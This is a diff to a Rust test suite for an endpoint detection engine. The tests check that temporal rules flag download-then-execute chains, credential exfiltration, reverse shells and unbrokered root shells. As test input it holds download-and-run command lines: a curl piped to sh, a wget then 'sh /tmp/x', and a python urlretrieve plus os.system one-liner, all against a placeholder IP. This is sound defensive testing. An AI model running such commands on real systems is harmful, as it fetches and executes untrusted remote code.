@@ -14,7 +14,7 @@ fn event(ts: i64, class: EventClass, pid: u32, process: &str, parent: &str) -> T
         file_write: false,
         file_hash: None,
         dst_port: None,
-        dst_ip: None,
+        dst_ip: (class == EventClass::NetworkConnect).then(|| "198.51.100.7".into()),
         dst_domain: None,
         command_line: None,
         event_size: None,
@@ -23,19 +23,6 @@ fn event(ts: i64, class: EventClass, pid: u32, process: &str, parent: &str) -> T
         container_escape: false,
         container_privileged: false,
     }
-}
-
-// Exercise the real agent seeds without building the agent-core crate.
-fn builtin(name: &str) -> &'static str {
-    let source = include_str!("../../agent-core/src/lifecycle/detection_bootstrap.rs");
-    let marker = format!("const {name}: &str = r#\"");
-    source
-        .split_once(&marker)
-        .unwrap()
-        .1
-        .split_once("\"#;")
-        .unwrap()
-        .0
 }
 
 #[test]
@@ -130,9 +117,8 @@ fn r2_exit_and_exec_invalidation_are_scoped_to_the_owning_pid() {
 }
 
 fn seeded(name: &str) -> TemporalEngine {
-    let mut engine = TemporalEngine::new();
-    engine.add_sigma_rule_yaml(builtin(name)).unwrap();
-    engine
+    let _ = name;
+    TemporalEngine::with_default_rules()
 }
 
 #[test]
@@ -216,30 +202,27 @@ fn audit_reorder_timestamps_are_per_pid_not_daemon_session() {
 
 #[test]
 fn audit_curl_pipe_shell_wget_then_shell_and_python_os_system_remain_detected() {
-    for (process, command, shell_parent, with_exit) in [
-        ("curl", "curl https://198.51.100.8/x", "bash", false),
-        ("wget", "wget https://198.51.100.8/x -O /tmp/x", "bash", true),
-        ("python3", "python3 -c import urllib.request,os; urllib.request.urlretrieve('https://198.51.100.8/x','/tmp/x'); os.system('sh /tmp/x')", "python3", false),
+    for (process, command, shell_command, image, expected) in [
+        ("curl", "curl https://198.51.100.8/x", "sh", "/bin/sh", "phi_download_pipe_shell"),
+        ("wget", "wget https://198.51.100.8/x -O /tmp/x", "sh /tmp/x", "/tmp/x", "phi_download_then_exec_file"),
+        ("python3", "python3 -c import urllib.request,os; urllib.request.urlretrieve('https://198.51.100.8/x','/tmp/x'); os.system('sh /tmp/x')", "sh /tmp/x", "/tmp/x", "phi_interpreter_download_exec"),
     ] {
         let mut engine = TemporalEngine::with_default_rules();
         let mut downloader = event(100, EventClass::ProcessExec, 200, process, "bash");
-        downloader.command_line = Some(command.to_string());
-        engine.observe(&downloader);
-        if with_exit {
-            let exit = event(101, EventClass::ProcessExit, 200, process, "bash");
-            engine.observe(&exit);
-        }
-        let mut shell = event(102, EventClass::ProcessExec, 201, "sh", shell_parent);
-        shell.ppid = if shell_parent == "python3" { 200 } else { 10 };
-        shell.command_line = Some("sh /tmp/x".to_string());
-        assert!(engine.observe(&shell).iter().any(|hit| hit == "phi_download_exec"), "{process}");
+        downloader.command_line = Some(command.into());
+        let mut hits = engine.observe(&downloader);
+        engine.observe(&event(101, EventClass::ProcessExit, 200, process, "bash"));
+        let mut shell = event(102, EventClass::ProcessExec, 201, "sh", "bash");
+        shell.command_line = Some(shell_command.into());
+        shell.file_path = Some(image.into());
+        hits.extend(engine.observe(&shell));
+        assert!(hits.iter().any(|hit| hit == expected), "{process}: {hits:?}");
     }
 }
 
 #[test]
 fn audit_sigma_write_intent_rejects_reads_but_detects_writes() {
     for yaml in [
-        builtin("SIGMA_PERSISTENCE"),
         "title: write_only\ndetection:\n  sequence:\n    - event_class: file_open\n      file_path_contains: [/etc/cron]\n      require_file_write: true\n      within_secs: 10\n",
     ] {
         let mut engine = TemporalEngine::new();
@@ -281,7 +264,7 @@ fn audit_builtin_data_exfil_needs_sensitive_file_not_library_read() {
     assert!(engine
         .observe(&connect)
         .iter()
-        .any(|hit| hit == "eguard_builtin_data_exfil"));
+        .any(|hit| hit == "phi_credential_exfil"));
 }
 
 #[test]
@@ -301,7 +284,7 @@ fn audit_builtin_reverse_shell_needs_shell_io_evidence_and_includes_https_port()
     assert!(engine
         .observe(&connect)
         .iter()
-        .any(|hit| hit == "eguard_builtin_reverse_shell"));
+        .any(|hit| hit == "phi_reverse_shell"));
 }
 
 #[test]
@@ -319,15 +302,15 @@ fn audit_builtin_privesc_does_not_join_arbitrary_user_and_root_daemons() {
     let root = event(101, EventClass::ProcessExec, 300, "sh", "cron");
     assert!(engine.observe(&root).is_empty());
     user.ts_unix = 102;
-    user.process = "sudo".to_string();
+    user.process = "exploit".to_string();
     user.parent_process = "sshd".to_string();
     engine.observe(&user);
-    let mut elevated = event(103, EventClass::ProcessExec, 201, "sh", "sudo");
+    let mut elevated = event(103, EventClass::ProcessExec, 201, "sh", "exploit");
     elevated.ppid = 200;
     assert!(engine
         .observe(&elevated)
         .iter()
-        .any(|hit| hit == "eguard_builtin_privesc"));
+        .any(|hit| hit == "phi_unbrokered_root_shell"));
 }
 
 #[test]
@@ -385,6 +368,6 @@ fn audit_each_sigma_event_is_observed_once_per_rule() {
     let rule = engine.add_sigma_rule_yaml("title: repeated_exec\ndetection:\n  sequence:\n    - event_class: process_exec\n      process_any_of: [bash]\n      within_secs: 10\n    - event_class: process_exec\n      process_any_of: [bash]\n      within_secs: 10\n").unwrap();
     let first = event(100, EventClass::ProcessExec, 200, "bash", "sh");
     assert!(!engine.observe(&first).contains(&rule));
-    let second = event(101, EventClass::ProcessExec, 201, "bash", "bash");
+    let second = event(101, EventClass::ProcessExec, 200, "bash", "bash");
     assert!(engine.observe(&second).contains(&rule));
 }
